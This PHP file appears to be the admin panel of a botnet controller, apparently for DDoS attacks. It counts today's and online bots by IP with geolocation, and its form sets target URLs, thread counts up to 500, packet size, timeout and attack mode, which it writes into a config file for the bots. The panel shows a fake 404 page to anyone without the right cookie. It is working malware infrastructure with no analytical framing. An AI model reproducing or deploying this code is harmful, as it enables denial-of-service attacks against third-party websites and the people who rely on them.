<?php
	if (($sokol=="1") and ($_COOKIE["dj"]==md5($password.$_SERVER["REMOTE_ADDR"]))) {
		mysql_connect($dbhost1, $dbuname1, $dbpass1) or die("Error connecting to database...");
		mysql_select_db($dbname1) or die("Error 5");
		$time=time();
		if ($_GET['i']=="install") {
			mysql_query("CREATE TABLE `n` (`ip` VARCHAR( 15 ) NOT NULL ,`n` INT( 10 ) NOT NULL ) ENGINE = MYISAM ;") or die("Error 1");
			mysql_query("CREATE TABLE `td` (`ip2` VARCHAR( 15 ) NOT NULL ,`ip` VARCHAR( 15 ) NOT NULL ,`time` INT( 10 ) NOT NULL) ENGINE = MYISAM ;") or die("Error 2");
			mysql_query("ALTER TABLE `td` ADD UNIQUE (`ip2`);") or die("Error 3");
			mysql_query("CREATE TABLE `l` (`k` VARCHAR( 32 ) NOT NULL ,`n` VARCHAR( 32 ) NOT NULL ,`time` INT( 10 ) NOT NULL) ENGINE = MYISAM ;") or die("Error 7");
			mysql_query("delete from `n` where `n`<($time-$timeout-1) ") or die('Error database...');
			mysql_query("delete from `td` where `time`<($time-86399) ")  or die('Error database...');
		} else {
			mysql_query("delete from `n` where `n`<($time-$timeout-1) ") or die('Error database... <a href=admin.php?login='.$GET_login.'&i=install>Install database...</a>');
			mysql_query("delete from `td` where `time`<($time-86399) ")  or die('Error database... <a href=admin.php?login='.$GET_login.'&i=install>Install database...</a>');
		}
		$time = time();
		if (($_GET['i']=='today')or($_GET['i']=='online')) {
			echo'<div class="content">
			<center>
			<table style="width: 75%"><tr><td style="width: 100%">
			<center>';
			if ($_GET['i']=='today') {
				$query = "SELECT * FROM `td`";
			}
			if ($_GET['i']=='online') {
				$query = "SELECT * FROM `n`";
			}
			$res = mysql_query($query) or die(mysql_error());
			$number = mysql_num_rows($res);
			if ($_GET['i']=='today') {
				echo 'Today: '.$number;
			}
			if ($_GET['i']=='online') {
				echo 'Online: '.$number;
			}
			echo '<br>';
  			while ($row=mysql_fetch_array($res)) {
				$ip = $row['ip'];
				$geo=user_geo_ip($ip,1);
				$stat[$geo]=$stat[$geo]+1;
				$stat2[$geo]=$ip;
  			}
			arsort($stat);
			reset($stat);
			foreach($stat as $i => $geo){ 
				echo ''.user_geo_ip($stat2[$i],3).' '.$stat[$i].'';
				echo '<br>';
			}
			echo'</center>
		</div>
			</center>
			';
		} else {
			$sql = mysql_query("select `n` from `n` ")  or die("Error 7");
			$num_rows = mysql_num_rows($sql);
			$online = $num_rows;
			$sql = mysql_query("select `time` from `td` ")  or die("Error 9");
			$num_rows = mysql_num_rows($sql);
			$today=$num_rows;

include("information.php");
$URL = str_replace('|',"\n",$URL);
if ($_POST['Save']!='') {
			$file_handle1 = fopen("information.php", "r");
  			if ( !$file_handle1 ) {
				echo '<h3>Error open file "information.php"</h3>';
			} else {
				while (!feof($file_handle1)) {
					$line1 = $line.fgets($file_handle1);
				}
				fclose($file_handle1);
$Thread1=$_POST['Thread'];
$Thread1=$Thread1+1;
$Thread1=$Thread1-1;
$timeoutS1=$_POST['timeoutS'];
$timeoutS1=$timeoutS1+0;
$size1=$_POST['size'];
$size1=$size1+0;
$mode1=$_POST['mode'];
$mode1=$mode1+0;
if ($timeoutS1>60000) {$timeoutS1=0;}
if ($size1>65535) {$size1=65535;}
if (($mode1!=0)and($mode1!=1)and($mode1!=2)and($mode1!=3)and($mode1!=4)) {$mode1=0;}
if ($Thread1<1) {$Thread1=0;}
if ($Thread1>500) {$Thread1=500;}
$URL1=$_POST['URL'];
$URL = str_replace("\n",'|',$URL);
$URL1 = str_replace("\n",'|',$URL1);
$line1 = str_replace('$Thread="'.$Thread.'";','$Thread="'.$Thread1.'";',$line1);
$line1 = str_replace('$URL="'.$URL.'";','$URL="'.$URL1.'";',$line1);
$line1 = str_replace('$timeoutS="'.$timeoutS.'";','$timeoutS="'.$timeoutS1.'";',$line1);
$line1 = str_replace('$size="'.$size.'";','$size="'.$size1.'";',$line1);
$line1 = str_replace('$mode="'.$mode.'";','$mode="'.$mode1.'";',$line1);
$timeoutS=$timeoutS1;
$size=$size1;
$mode=$mode1;
$URL=$URL1;
$Thread=$Thread1;
$URL = str_replace('|',"\n",$URL);
$URL1 =$URL;
  				$file1 = fopen("information.php","w+");
  				if ( !$file1 ) {
					echo '<h3>Error open file "information.php"</h3>';
				} else {
					fputs ($file1, $line1);
  				}
 				fclose ($file1);
			}
echo '<meta http-equiv="REFRESH" CONTENT="0;URL=admin.php?login='.$GET_login.'">';
}
			echo'
		<div class="content">
			<center>
			<table border="0" align="center">
				<tr>
 				<td style="width: 45%">Today bots: <a href=admin.php?login='.$GET_login.'&i=today><font color="#FFFFFF">'.$today.'</font></a></font></td>
 				<tr>
				<td style="width: 45%">Online bots: <a href=admin.php?login='.$GET_login.'&i=online><font color="#FFFFFF">'.$online.'</font></a></font></td>
				</tr>
			</table>
		</div>
			<br>
			<form action=admin.php?login='.$GET_login.'&i='.$stop.' method="POST" align="center">
			<div class="textarea"><textarea name="URL">'.$URL.'</textarea></div>
			<div class="input">
				<input type="submit" name="Save" class="button" value="Save">
			</div>
			
			<div class="blocks">
				<div class="left"><div class="cell">
					Threads
				</div></div>
				<div class="right"><div class="cell">
					<input type="text" name="Thread" value="'.$Thread.'" />
				</div></div>
			</div>

			<div class="blocks">
				<div class="left"><div class="cell">
					Timeout
				</div></div>
				<div class="right"><div class="cell">
					<input type="text" name="timeoutS" value="'.$timeoutS.'" />
				</div></div>
			</div>
		
			
			<div class="blocks">
				<div class="left"><div class="cell">
					Mode
				</div></div>
				<div class="right"><div class="cell">
					<input type="text" name="mode" value="'.$mode.'" />
				</div></div>
			</div>
			
		</form>
			';
		}
	} else {
		include"404.php";
	}
?>
